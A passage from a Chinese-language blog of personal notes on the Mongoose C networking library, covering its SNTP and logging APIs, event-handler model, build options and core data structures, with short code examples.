            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_sntp/" class="post-title-link" itemprop="url">mongoose_sntp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>SNTP server(simple network time protocol), 是一种用于提供时间同步服务的网络服务器。它基于网络通信协议，允许计算机和其他网络设备通过网络获取准确的时间信息</li>
</ul>
<h2 id="mg-sntp-connect"><a href="#mg-sntp-connect" class="headerlink" title="mg_sntp_connect"></a>mg_sntp_connect</h2><ul>
<li><p>简介：</p>
<ul>
<li>连接SNTP服务器。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_connection</span> *<span class="built_in">mg_sntp_connect</span>(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">const</span> <span class="type">char</span> *url,</span><br><span class="line">                                      <span class="type">mg_event_handler_t</span> fn, <span class="type">void</span> *fn_data)</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>mgr – 使用的事件管理器</li>
<li>url – 指定远程URL，如果为空，则为time.google.com。</li>
<li>fn  – 事件处理函数</li>
<li>fn_data – 一个任意指针，在调用事件处理程序时作为fn_data传递。该指针也将作为c-&gt;fn_data存储在连接结构中。</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回指向创建的连接的指针</li>
<li>失败，返回NULL</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">sntp_cb</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *evd, <span class="type">void</span> *fnd)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_SNTP_TIME) &#123;</span><br><span class="line">    <span class="comment">// Time received</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">timeval</span> *tv = (<span class="keyword">struct</span> timeval *tv)evd;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="built_in">mg_sntp_connect</span>(mgr&amp;, <span class="literal">NULL</span> <span class="comment">/* connect to time.google.com */</span>, sntp_cb, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-sntp-request"><a href="#mg-sntp-request" class="headerlink" title="mg_sntp_request"></a>mg_sntp_request</h2><ul>
<li><p>简介：</p>
<ul>
<li>向SNTP服务器发送时间请求</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_sntp_request</span><span class="params">(<span class="keyword">struct</span> mg_connection *c)</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c – 使用的连接</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mg_sntp_request</span>(c);</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_logging/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_logging/" class="post-title-link" itemprop="url">mongoose_logging</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>mongoose 日志相关函数</li>
<li>Mongoose为日志记录提供了一系列函数和宏。应用程序可以为自己的目的使用这些函数，也可以使用Mongoose API的其他部分。</li>
</ul>
<h2 id="LOG"><a href="#LOG" class="headerlink" title="LOG"></a>LOG</h2><ul>
<li><p>简介：</p>
<ul>
<li>日志宏</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(level, args)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MG_ERROR(args) MG_LOG(MG_LL_ERROR, args)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MG_INFO(args) MG_LOG(MG_LL_INFO, args)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MG_DEBUG(args) MG_LOG(MG_LL_DEBUG, args)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MG_VERBOSE(args) MG_LOG(MG_LL_VERBOSE, args)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">MG_INFO</span>((<span class="string">&quot;Hello %s!&quot;</span>, <span class="string">&quot;world&quot;</span>));  <span class="comment">// Output &quot;Hello, world&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-log-set"><a href="#mg-log-set" class="headerlink" title="mg_log_set"></a>mg_log_set</h2><ul>
<li><p>简介：</p>
<ul>
<li>设置Mongoose日志级别</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_log_set</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *spec)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>spec – 字符串，包含日志级别，可以是以下值之一<ul>
<li>0 – 关闭日志</li>
<li>1 – 仅输出错误</li>
<li>2 – 输出错误和消息</li>
<li>3 – 输出错误，消息和调试消息</li>
<li>4 – 输出所有日志信息</li>
</ul>
</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>详解：</p>
<ul>
<li>可以根据源文件覆盖日志级别。例如，如果有一个名为foo.c的文件，您希望将全局级别设置为2（info），但将foo.c文件的日志级别提高到debug，那么规格应该是 “2,foo.c&#x3D;3”。可以有多个以逗号分隔的重写。</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mg_log_set</span>(<span class="string">&quot;2&quot;</span>);                  <span class="comment">// Set log level to info</span></span><br><span class="line"><span class="built_in">mg_log_set</span>(<span class="string">&quot;2,foo.c=3,bar.c=0&quot;</span>);  <span class="comment">// Set log level to info, with overrides</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-hexdump"><a href="#mg-hexdump" class="headerlink" title="mg_hexdump"></a>mg_hexdump</h2><ul>
<li><p>简介：</p>
<ul>
<li>记录二进制数据buf, len的十六进制转储。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_hexdump</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">int</span> len)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>buf – 数据指针</li>
<li>len – 数据大小</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mg_hexdump</span>(c-&gt;recv.buf, c-&gt;recv.len);  <span class="comment">// Hex dump incoming data</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-log-set-fn"><a href="#mg-log-set-fn" class="headerlink" title="mg_log_set_fn"></a>mg_log_set_fn</h2><ul>
<li><p>简介：</p>
<ul>
<li>将日志重定向到自定义函数。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_log_set_fn</span><span class="params">(<span class="type">mg_pfn_t</span> logfunc, <span class="type">void</span> *param)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>logfunc – 记录单个字符的函数指针</li>
<li>param – 日志函数参数</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">mylog</span><span class="params">(<span class="type">char</span> ch, <span class="type">void</span> *param)</span> </span>&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">  <span class="type">static</span> <span class="type">size_t</span> len;</span><br><span class="line">  buf[len++] = ch;</span><br><span class="line">  <span class="keyword">if</span> (ch == <span class="string">&#x27;\n&#x27;</span> || len &gt;= <span class="built_in">sizeof</span>(buf)) &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(LOG_INFO, <span class="string">&quot;%.*s&quot;</span>, (<span class="type">int</span>) len, buf); <span class="comment">// Send logs</span></span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="built_in">mg_log_set_fn</span>(mylog, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-Overview/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-Overview/" class="post-title-link" itemprop="url">Overview</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li><p>使用方式</p>
<ul>
<li>添加<code>mongoose.h</code>和<code>mongoose.c</code>文件</li>
</ul>
</li>
<li><p>两个基本数据结构</p>
<ul>
<li><code>struct mg_mgr</code>  –  持有所有运行连接的事件管理</li>
<li><code>struct mg_connection</code>  –  单个连接描述符。换言之，每个连接都通过结构mg_connection结构来描述</li>
</ul>
</li>
<li><p>事件处理，每一个连接有两个事件处理函数：<code>c-&gt;fn</code>和<code>c-&gt;pfn</code></p>
<ul>
<li><code>c-&gt;fn</code>，是由用户自定义的事件处理函数</li>
<li><code>c-&gt;pfn</code>，是一个特定于协议的处理程序函数，被隐式设置。例如，<code>mg_http_listen()</code>将<code>c-&gt;pfn</code>设置为mongoose的HTTP事件处理程序。</li>
</ul>
</li>
<li><p>在特定于用户的处理程序之前调用特定于协议的处理程序。它解析传入数据，并可能调用特定于协议的事件，例如<code>MG_EV_HTTP_MSG</code></p>
</li>
<li><p>注意：</p>
<ul>
<li>由于Mongoose的核心不受并发访问的保护，因此请确保从同一线程或RTOS任务调用所有<code>mg_*</code> API函数</li>
</ul>
</li>
<li><p>发送和接收缓冲区，每一个连接有一个发送和接收缓冲区：<code>struct mg_connection::send</code>, <code>struct mg_connection::recv</code></p>
<ul>
<li><code>struct mg_connection::send</code> : 将发送到对端的数据</li>
<li><code>struct mg_connection::recv</code> : 从对端接收的数据</li>
</ul>
</li>
<li><p>当数据到达时，mongoose将接收到的数据追加到<code>recv</code>并触发一个<code>MG_EV_READ</code>事件。</p>
</li>
<li><p>用户可以通过调用输出函数之一来发送数据，例如<code>mg_send()</code>，<code>mg_printf()</code>或类似于<code>mg_ws_send()</code>的协议特定函数。</p>
</li>
<li><p>输出函数将数据追加到<code>send</code>缓冲区。当mongoose成功将数据写入套接字中时，它会将数据从结构体<code>mg_connection::send</code>中丢掉并且发送一个<code>MG_EV_WRITE</code>事件</p>
</li>
<li><p>每个连接都有与之关联的事件处理函数，该功能必须由用户实现。事件处理函数是mongoose的关键要素，因为它定义了连接的行为</p>
</li>
<li><p>事件处理函数示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Event handler function defines connection&#x27;s behavior</span><br><span class="line">static void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_READ) &#123;</span><br><span class="line">    mg_send(c, c-&gt;recv.buf, c-&gt;recv.len);   // Implement echo server</span><br><span class="line">    c-&gt;recv.len = 0;                        // Delete received data</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>参数：</p>
<ul>
<li><code>struct mg_connection *c</code>  –  接收事件的连接</li>
<li><code>int ev</code>                   –  在<code>mongoose.h</code>中定义的事件编号。例如，当数据到达入站连接时，<code>ev</code>将是<code>MG_EV_READ</code></li>
<li><code>void *ev_data</code>            –  指向特定于事件的数据，并且对不同事件具有不同的含义。<ul>
<li>例如，对于<code>MG_EV_READ</code>事件，<code>ev_data</code>是一个<code>int *</code>指向从远程对等方接收的字节数，并保存到<code>c-&gt;recv</code> IO缓冲区中。</li>
<li><code>ev_data</code>的确切含义是<strong>用来描述每一个事件</strong>。</li>
<li>特定于协议的事件通常将<code>ev_data</code>指向具有特定协议信息的结构</li>
</ul>
</li>
<li><code>void *fn_data</code>            –  连接的用户定义指针，这是用于应用程序特定数据的占位符。<ul>
<li>这个<code>fn_data</code>指针是在<code>*_listen()</code>或者<code>*_connect()</code>调用期间设置的，并将其存储在<code>c-&gt;fn_data</code>。</li>
<li>监听连接将<code>c-&gt;fn_data</code>的值复制到新接受的连接，因此所有接受的连接最初共享相同的<code>fn_data</code>指针。</li>
<li>通过设置<code>c-&gt;fn_data = new_value</code>，可以随时更新或替换任何连接的<code>fn_data</code>指针</li>
</ul>
</li>
</ul>
</li>
<li><p><code>struct mg_connection</code>具有带有连接标志的设置。标志是二进制的：它们是0或者1。一些标志是由mongoose设置的，应用代码不能修改。例如，<code>is_udp</code>标志告诉应用连接是不是UDP。</p>
</li>
<li><p>一些标志是应用代码可以修改的，它们是：<code>is_hexdumping</code>, <code>id_draining</code>, <code>is_closing</code>。</p>
<ul>
<li><code>id_draining</code>标志，如果用户设置了这个标志，就是告诉mongoose向对端发送剩余数据，当都发送完毕时，关掉这个连接</li>
<li><code>is_closing</code>标志，如果用户设置了这个标志，就是立即关闭并释放连接，而不需要发送剩余数据</li>
<li><code>is_hexdumping</code>标志，</li>
</ul>
</li>
<li><p>调试日志。要增加调试的详细性，调用<code>mg_log_set()</code> ： <code>mg_log_set(MG_LL_DEBUG); mg_mgr_init(&amp;mgr);</code></p>
<ul>
<li><code>MG_INFO()</code>, <code>MG_DEBUG()</code>日志宏默认情况下使用<code>putchar()</code>，即它们使用标准的C stdout流。这种方式在传统的操作系统环境正常工作。在嵌入式环境中，为了查看调试日志，可以使用两种方式：IO重定位和日志重定向<ul>
<li>IO重定位可以通过嵌入式SDK实现</li>
</ul>
</li>
</ul>
</li>
<li><p>如果您需要执行连接的任何初始化，请通过捕获<code>MG_EV_OPEN</code>事件进行操作。</p>
</li>
<li><p>该事件是在连接被分配并添加到事件管理之后立即发送的，并在其他任何内容之前。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">if (ev == MG_EV_OPEN) &#123;</span><br><span class="line">  ... // Do your initialisation</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果您需要保留一些特定连接的数据，则有两个选择</p>
<ul>
<li>第一，使用<code>c-&gt;fn_data</code>指针。该指针作为最后一个参数传递给事件处理程序<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_OPEN) &#123;</span><br><span class="line">    c-&gt;fn_data = malloc(123);       // Change our fn_data</span><br><span class="line">  &#125; else if (ev == MG_EV_CLOSE) &#123;</span><br><span class="line">    free(fn_data);  // Don&#x27;t forget to free!</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Every accepted connection inherit NULL pointer as c-&gt;fn_data, but we change</span><br><span class="line">// it per-connection to something else</span><br><span class="line">mg_http_listen(&amp;mgr, &quot;http://localhost:1234&quot;, fn, NULL);</span><br></pre></td></tr></table></figure></li>
<li>第二，使用<code>c-&gt;label</code>缓冲区。该缓冲区可以容纳一些特定于连接的数据，而无需额外的内存分配<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_WS_OPEN) &#123;</span><br><span class="line">    c-&gt;label[0] = &#x27;W&#x27;; // Established websocket connection, store something</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>如果需要关闭连接，请在自己的事件处理函数中设置<code>c-&gt;is_draining = 1;</code>。它将告诉mongoose向对端发送剩余数据，当都发送完毕时，关掉这个连接</p>
</li>
<li><p>如果需要立即关闭而不需要发送剩余数据，则设置<code>c-&gt;is_closing = 1;</code></p>
</li>
<li><p>使用<code>mg_http_reply()</code>函数创建HTTP响应报文。重要的是，这个函数能够正确设置<code>Content-Length</code>头。</p>
</li>
<li><p>当然，也可以手动创建HTTP响应报文。例如，使用<code>mg_printf()</code>函数，但是请确定设置了<code>Content-Length</code>头</p>
<ul>
<li><code>mg_printf(c, &quot;HTTP/1.1 200 OK\r\Content-Length: %d\r\n\r\n%s&quot;, 2, &quot;hi&quot;);</code></li>
</ul>
</li>
<li><p>或者，使用块的传输编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mg_printf(c, &quot;HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n&quot;);</span><br><span class="line">mg_http_printf_chunk(c, &quot;%s&quot;, &quot;foo&quot;);</span><br><span class="line">mg_http_printf_chunk(c, &quot;%s&quot;, &quot;bar&quot;);</span><br><span class="line">mg_http_printf_chunk(c, &quot;&quot;);  // Don&#x27;t forget the last empty chunk</span><br></pre></td></tr></table></figure></li>
<li><p>需要注意的是：如果不适用<code>mg_http_reply()</code>或者<code>mg_http_*_chunk()</code>，请确保在自己的活动处理程序完成写入响应报文时，确保设置<code>c-&gt;is_reply = 0;</code></p>
</li>
<li><p>默认情况下，IO缓冲区分配的大小<code>MG_IO_SIZE</code>是2048.将其更改为512可以减少每个连接的内存消耗</p>
</li>
<li><p>Mongoose有三种影响构建的构建常数（预处理器定义）：目标体系结构&#x2F;操作系统，目标网络堆栈，可调参数。</p>
</li>
<li><p>为了在构建时间设置选项，请使用-D选项编译器标志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cc app.c mongoose.c                           # Use defaults!</span><br><span class="line">$ cc app.c mongoose.c -D MG_ENABLE_IPV6=1       # Build with IPv6 enabled</span><br><span class="line">$ cc app.c mongoose.c -D MG_ARCH=MG_ARCH_RTX    # Set architecture</span><br><span class="line">$ cc app.c mongoose.c -D MG_ENABLE_SSI=0 -D MG_IO_SIZE=8192  # Multiple options</span><br></pre></td></tr></table></figure></li>
<li><p>支持架构的列表在<code>Arch.H</code>标题文件中定义。通常，无需明确指定体系结构。在构建过程中猜到了架构，因此通常不需要设置 </p>
</li>
<li><p>网络堆栈常数在下面列出。请注意，如果未指定网络堆栈，则假定目标体系结构支持标准BSD套接字API</p>
</li>
<li><p>另一类的构建常量是在<code>src/config.h</code>中定义的，以及它们的默认值。这些是包含&#x2F;排除某个功能或更改相关参数的调谐物。</p>
</li>
<li><p><code>MG_IO_SIZE</code>常数还设置了最大的UDP消息大小，请参见<code>#/907</code>有关详细信息。如果应用程序使用大型UDP消息，请相应地增加<code>MG_IO_SIZE</code>限制。</p>
</li>
<li><p>此步骤是可选的，仅当您打算使用自定义TCP&#x2F;IP堆栈时才需要。为此，您应该：</p>
<ul>
<li>禁用BSD插座API：在Mongoose_custom.h中，添加<code>#define MG_ENABLE_SOCKET 0</code></li>
</ul>
</li>
<li><p>添加几个内部API函数的实现，例如<code>mg_send()</code>, <code>mg_mgr_poll()</code>等等。要参考，请查看<code>test/mongoose_custom.c</code>和实验性的<code>src/mip.c</code></p>
</li>
</ul>
<h2 id="重要API"><a href="#重要API" class="headerlink" title="重要API"></a>重要API</h2><h3 id="1-1-数据结构"><a href="#1-1-数据结构" class="headerlink" title="1.1 数据结构"></a>1.1 数据结构</h3><h4 id="struct-mg-addr"><a href="#struct-mg-addr" class="headerlink" title="struct mg_addr"></a><code>struct mg_addr</code></h4>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct mg_addr &#123;</span><br><span class="line">  uint16_t port;    // TCP or UDP port in network byte order</span><br><span class="line">  uint32_t ip;      // IP address in network byte order</span><br><span class="line">  uint8_t ip6[16];  // IPv6 address</span><br><span class="line">  bool is_ip6;      // True when address is IPv6 address</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>该结构包含网络地址。它可以被认为<code>sockaddr</code>结构在Mongoose中的等价结构体</li>
</ul>
<h4 id="struct-mg-mgr"><a href="#struct-mg-mgr" class="headerlink" title="struct mg_mgr"></a><code>struct mg_mgr</code></h4>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct mg_mgr &#123;</span><br><span class="line">  struct mg_connection *conns;  // List of active connections  结构体数组</span><br><span class="line">  struct mg_dns dns4;           // DNS for IPv4</span><br><span class="line">  struct mg_dns dns6;           // DNS for IPv6</span><br><span class="line">  int dnstimeout;               // DNS resolve timeout in milliseconds</span><br><span class="line">  unsigned long nextid;         // Next connection ID</span><br><span class="line">  void *userdata;               // Arbitrary user data pointer</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>它是一个事件管理结构体，能够保存一个正在活动的连接列表，以及一些维持管理的信息</li>
</ul>
<h4 id="struct-mg-connection"><a href="#struct-mg-connection" class="headerlink" title="struct mg_connection"></a><code>struct mg_connection</code></h4>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">struct mg_connection &#123;</span><br><span class="line">  struct mg_connection *next;  // Linkage in struct mg_mgr :: connections</span><br><span class="line">  struct mg_mgr *mgr;          // Our container</span><br><span class="line">  struct mg_addr loc;          // Local address</span><br><span class="line">  struct mg_addr rem;          // Remote address</span><br><span class="line">  void *fd;                    // 